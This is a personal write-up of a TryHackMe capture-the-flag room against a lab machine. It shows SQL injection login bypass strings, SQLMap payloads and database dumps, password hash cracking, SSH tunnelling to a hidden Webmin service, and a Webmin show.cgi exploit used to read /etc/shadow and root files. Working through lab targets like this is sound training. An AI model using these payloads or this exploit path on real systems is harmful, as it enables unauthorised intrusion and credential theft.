#this room is supposed to be on SQLi exploiting using SQLMap 
        #Ive done this about once before I think
#also crack hashed passords and SSH into hidden services - Metasploit privesc

#as always, I start off with nmap and dirb enumeration
(kali㉿kali)-[~/THM/practice/gamezone]
└─$ nmap -sC -sV 10.10.224.42                                                                         255 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-11 07:34 EST
Nmap scan report for 10.10.224.42
Host is up (0.020s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)
|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)
|_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Game Zone
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.57 seconds
#dirb did not reult in anything good



### obtaining access via SQLi ###

#I tried logging in on the site using admin:' or 1=1 -- -
#but it did not work.., so I fired up burp to try and put it trough there instead
username=admin&password=%27or1%3D1---&x=0&y=0
#as shown there was not merely the uname:password parameters but an x and y too
#apparently there is no admin user, so I proceeded to use ' or 1 = 1 -- - as the uname and leaving password blank:
        #x and y values changed to 32 and 12 respectively, indicating there is definitely a user
#now we have access to a portal 








### using SQLMap ###
        #there aremany diff types of SQLi, but SQLMap is automatic and tries all of it

#1 intercept search request w burp
#2 save it to a text file
#3 pass it into sqlmap:
┌──(kali㉿kali)-[~/THM/practice/gamezone]
└─$ sqlmap -r search_request.txt --dbms=mysql --dump                                        
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.5.8#stable}
|_ -| . [)]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 07:55:43 /2022-02-11/

[07:55:43] [INFO] parsing HTTP request from 'search_request.txt'
[07:55:44] [INFO] testing connection to the target URL
[07:55:44] [INFO] checking if the target is protected by some kind of WAF/IPS
[07:55:44] [INFO] testing if the target URL content is stable
[07:55:44] [INFO] target URL content is stable
[07:55:44] [INFO] testing if POST parameter 'searchitem' is dynamic
[07:55:44] [INFO] POST parameter 'searchitem' appears to be dynamic
[07:55:44] [INFO] heuristic (basic) test shows that POST parameter 'searchitem' might be injectable (possible DBMS: 'MySQL')
[07:55:44] [INFO] heuristic (XSS) test shows that POST parameter 'searchitem' might be vulnerable to cross-site scripting (XSS) attacks
[07:55:44] [INFO] testing for SQL injection on POST parameter 'searchitem'
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[07:55:55] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[07:55:55] [WARNING] reflective value(s) found and filtering out
[07:55:56] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[07:55:56] [INFO] testing 'Generic inline queries'
[07:55:56] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[07:55:56] [INFO] POST parameter 'searchitem' appears to be 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)' injectable (with --string="its")
[07:55:56] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[07:55:56] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[07:55:56] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[07:55:56] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[07:55:56] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[07:55:56] [INFO] POST parameter 'searchitem' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
[07:55:56] [INFO] testing 'MySQL inline queries'
[07:55:56] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[07:55:57] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[07:55:57] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[07:55:57] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[07:55:57] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[07:55:57] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[07:55:57] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[07:56:07] [INFO] POST parameter 'searchitem' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[07:56:07] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[07:56:07] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[07:56:07] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[07:56:07] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[07:56:07] [INFO] target URL appears to have 3 columns in query
[07:56:07] [INFO] POST parameter 'searchitem' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'searchitem' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 50 HTTP(s) requests:
---
Parameter: searchitem (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: searchitem=hitman%' AND 6695=6695#

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: searchitem=hitman%' AND GTID_SUBSET(CONCAT(0x7162626271,(SELECT (ELT(1997=1997,1))),0x71717a6b71),1997) AND 'QcVF%'='QcVF

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: searchitem=hitman%' AND (SELECT 5010 FROM (SELECT(SLEEP(5)))Oexe) AND 'dRYU%'='dRYU

    Type: UNION query
    Title: MySQL UNION query (NULL) - 3 columns
    Payload: searchitem=hitman%' UNION ALL SELECT NULL,CONCAT(0x7162626271,0x7a47596361476466636b425a6c526f4548436c48736c4577476a654a6f4372576566544b736a734f,0x71717a6b71),NULL#
---
[07:58:50] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.10 or 16.04 (xenial or yakkety)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.6
[07:58:50] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[07:58:50] [INFO] fetching current database
[07:58:50] [INFO] fetching tables for database: 'db'
[07:58:50] [INFO] fetching columns for table 'post' in database 'db'
[07:58:50] [INFO] fetching entries for table 'post' in database 'db'
Database: db
Table: post
[5 entries]
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id | name                           | description                                                                                                                                                                                            |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1  | Mortal Kombat 11               | Its a rare fighting game that hits just about every note as strongly as Mortal Kombat 11 does. Everything from its methodical and deep combat.                                                         |
| 2  | Marvel Ultimate Alliance 3     | Switch owners will find plenty of content to chew through, particularly with friends, and while it may be the gaming equivalent to a Hulk Smash, that isnt to say that it isnt a rollicking good time. |
| 3  | SWBF2 2005                     | Best game ever                                                                                                                                                                                         |
| 4  | Hitman 2                       | Hitman 2 doesnt add much of note to the structure of its predecessor and thus feels more like Hitman 1.5 than a full-blown sequel. But thats not a bad thing.                                          |
| 5  | Call of Duty: Modern Warfare 2 | When you look at the total package, Call of Duty: Modern Warfare 2 is hands-down one of the best first-person shooters out there, and a truly amazing offering across any system.                      |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+

[07:58:50] [INFO] table 'db.post' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.224.42/dump/db/post.csv'                                                                                              
[07:58:50] [INFO] fetching columns for table 'users' in database 'db'
[07:58:50] [INFO] fetching entries for table 'users' in database 'db'
[07:58:50] [INFO] recognized possible password hashes in column 'pwd'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[07:58:57] [INFO] writing hashes to a temporary file '/tmp/sqlmaph26xmc2c2247/sqlmaphashes-s3qnbv47.txt' 
do you want to crack them via a dictionary-based attack? [Y/n/q] y
[07:59:02] [INFO] using hash method 'sha256_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 2
what's the custom dictionary's location?
> /usr/share/wordlists/rockyou.txt
[08:00:02] [INFO] using custom dictionary
do you want to use common password suffixes? (slow!) [y/N] n
[08:00:08] [INFO] starting dictionary-based cracking (sha256_generic_passwd)
[08:00:08] [INFO] starting 4 processes 
[08:00:16] [INFO] cracked password 'videogamer124' for user 'agent47'                                      
Database: db                                                                                               
Table: users
[1 entry]
+----------------------------------------------------------------------------------+----------+
| pwd                                                                              | username |
+----------------------------------------------------------------------------------+----------+
| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 (videogamer124) | agent47  |
+----------------------------------------------------------------------------------+----------+

[08:01:12] [INFO] table 'db.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.224.42/dump/db/users.csv'                                                                                            
[08:01:12] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.224.42'                                                                                                          
[08:01:12] [WARNING] your sqlmap version is outdated

[*] ending @ 08:01:12 /2022-02-11/

#ended up getting alot of data, and apparently sqlmap can try and crack the hashes for you
        #+ I need to update my sqlpmap 
#importnat info = password + username + table 'post'






### Cracking a password with JohnTheRipper ###
#I didnt use john, as sqlmap dehashed it for me, but command would be:
(kali㉿kali)-[~/THM/practice/gamezone]
└─$ john hash.txt -wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
        #where hash.txt contains the hash
#final step of this part of the room was to ssh into the machine
(kali㉿kali)-[~/THM/practice/gamezone]
└─$ ssh agent47@10.10.222.212          
The authenticity of host '10.10.222.212 (10.10.222.212)' can't be established.
ECDSA key fingerprint is SHA256:mpNHvzp9GPoOcwmWV/TMXiGwcqLIsVXDp5DvW26MFi8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.222.212' (ECDSA) to the list of known hosts.
agent47@10.10.222.212's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

109 packages can be updated.
68 updates are security updates.


Last login: Fri Aug 16 17:52:04 2019 from 192.168.1.147
agent47@gamezone:~$ 

# just to get the flag left
agent47@gamezone:~$ cat user.txt
649ac17b1480ac13ef1e4fa579dac95c







### exposing services with reverse SSH tunnels ###
#-L = local tunnel
        #forwrading traffic to your own server for viewing
        #YOU <-- CLIENT
#-R = remote tunnel 
        #forwarding traffic to other servers
        #CLIENT --> YOU

#tool used to investigate sockets running on a host = ss:
agent47@gamezone:~$ ss -tulpn
Netid  State      Recv-Q Send-Q      Local Address:Port                     Peer Address:Port              
udp    UNCONN     0      0                       *:68                                  *:*                  
udp    UNCONN     0      0                       *:10000                               *:*                  
tcp    LISTEN     0      128                     *:10000                               *:*                  
tcp    LISTEN     0      128                     *:22                                  *:*                  
tcp    LISTEN     0      80              127.0.0.1:3306                                *:*                  
tcp    LISTEN     0      128                    :::80                                 :::*                  
tcp    LISTEN     0      128                    :::22                                 :::*

        #t=TCP, u=UDP, l=listening, p=process using socket, n=doesnt resolve service names

#following code tunnels the ssh session to a local web server
(kali㉿kali)-[~/THM/practice/gamezone]
└─$ ssh -L 10000:localhost:10000 agent47@10.10.222.212                          
agent47@10.10.222.212's password: 
Permission denied, please try again.
agent47@10.10.222.212's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

109 packages can be updated.
68 updates are security updates.


Last login: Sat Feb 12 11:11:35 2022 from 10.11.59.68
agent47@gamezone:~$ 
#next I went to http://localhost:10000, where there was a Webmin login portal
#I proceeded to login with agent47:videogamer124

#the exposed CMS is webmin
        #a CMS is a Content Management System Software









## metasploit privesc ###
#finding a payload using metasploit
msf6 > search webmin 1.580

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
   1  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
        #this is the exploits I found
        #I felt a bit in over my head so I looked up some help from a writeup

#the first one is apparently a good one, so I did some research on it and how to use it --> https://www.exploit-db.com/exploits/21851

#having a quick look at the exploit, it seems it is manipulating the login and sesssion cookies
        #however, there was no info regarding how to use it...but this website does: http://www.americaninfosec.com/research/dossiers/AISG-12-001.pdf

#the way it works is to add /file/show.cgi/<command> to the URL of the webmin:
http://localhost:10000/file/show.cgi/etc/shadow

#this can then be used to gain info we can use to login as root.
        #root's password is encrypte with $6$ aka SHA256/SHA512 and is therefore crackable using hashcat or john

#so I stored this in a file hash.txt:
root:$6$Llhg4MdC$f9TRe8xLelwHpj5JvCNprpWBnHppEnryPo1mGiKW2U71SpTVZRRE0f7/3kZsIwNsRpcc7GlcVSnuYfiN5n7Yw.:18124:0:99999:7:::
#I tried running it through john but no luck..

#therefore went straight to root directory via URL:
http://localhost:10000/file/show.cgi/root/root.txt

#and got the flag:
a4b945830144bdd71908d12d902adeee

#Ive realised I need to look over some password cracking with john and hashcat...


:))